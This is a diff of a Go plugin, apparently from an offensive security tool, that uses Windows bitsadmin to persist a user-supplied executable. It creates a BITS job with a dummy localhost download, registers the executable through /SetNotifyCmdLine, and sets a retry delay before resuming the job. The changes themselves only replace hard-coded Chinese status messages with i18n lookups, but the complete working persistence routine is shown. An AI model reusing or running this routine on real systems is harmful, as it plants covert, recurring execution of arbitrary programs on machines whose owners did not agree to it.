@@ -26,10 +26,10 @@ func NewWinBITSPlugin() *WinBITSPlugin {
 func (p *WinBITSPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
 	pePath := session.Config.WinPEFile
 	if pePath == "" {
-		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
+		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
 	}
 	if _, err := os.Stat(pePath); err != nil {
-		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
+		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
 	}
 
 	absPath, _ := filepath.Abs(pePath)
@@ -41,7 +41,7 @@ func (p *WinBITSPlugin) Scan(ctx context.Context, info *common.HostInfo, session
 	// 创建任务并提取 GUID
 	out, err := exec.Command("bitsadmin", "/create", "/download", jobName).CombinedOutput()
 	if err != nil {
-		output.WriteString(fmt.Sprintf("[失败] 创建任务: %s\n", strings.TrimSpace(string(out))))
+		output.WriteString(i18n.Tr("winbits_create_task_failed", strings.TrimSpace(string(out))) + "\n")
 		return &plugins.Result{Success: false, Output: output.String()}
 	}
 
@@ -55,29 +55,29 @@ func (p *WinBITSPlugin) Scan(ctx context.Context, info *common.HostInfo, session
 		}
 	}
 	if guid == "" {
-		output.WriteString("[失败] 无法提取任务 GUID\n")
+		output.WriteString(i18n.GetText("winbits_guid_extract_failed") + "\n")
 		return &plugins.Result{Success: false, Output: output.String()}
 	}
-	output.WriteString(fmt.Sprintf("[成功] 创建任务: %s (%s)\n", jobName, guid))
+	output.WriteString(i18n.Tr("winbits_task_created", jobName, guid) + "\n")
 
 	steps := []struct {
 		desc string
 		args []string
 	}{
-		{"添加文件", []string{"/addfile", guid, "http://localhost/update", fmt.Sprintf(`%s\%s_tmp`, os.TempDir(), baseName)}},
-		{"设置回调", []string{"/SetNotifyCmdLine", guid, absPath, "NUL"}},
-		{"设置重试", []string{"/SetMinRetryDelay", guid, "60"}},
-		{"恢复任务", []string{"/resume", guid}},
+		{i18n.GetText("winbits_add_file"), []string{"/addfile", guid, "http://localhost/update", fmt.Sprintf(`%s\%s_tmp`, os.TempDir(), baseName)}},
+		{i18n.GetText("winbits_set_callback"), []string{"/SetNotifyCmdLine", guid, absPath, "NUL"}},
+		{i18n.GetText("winbits_set_retry"), []string{"/SetMinRetryDelay", guid, "60"}},
+		{i18n.GetText("winbits_resume_task"), []string{"/resume", guid}},
 	}
 
 	successCount := 1
 	for _, step := range steps {
 		out, err := exec.Command("bitsadmin", step.args...).CombinedOutput()
 		if err != nil {
-			output.WriteString(fmt.Sprintf("[失败] %s: %s\n", step.desc, strings.TrimSpace(string(out))))
+			output.WriteString(i18n.Tr("local_step_failed", step.desc, strings.TrimSpace(string(out))) + "\n")
 			continue
 		}
-		output.WriteString(fmt.Sprintf("[成功] %s\n", step.desc))
+		output.WriteString(i18n.Tr("local_step_success", step.desc) + "\n")
 		successCount++
 	}
 
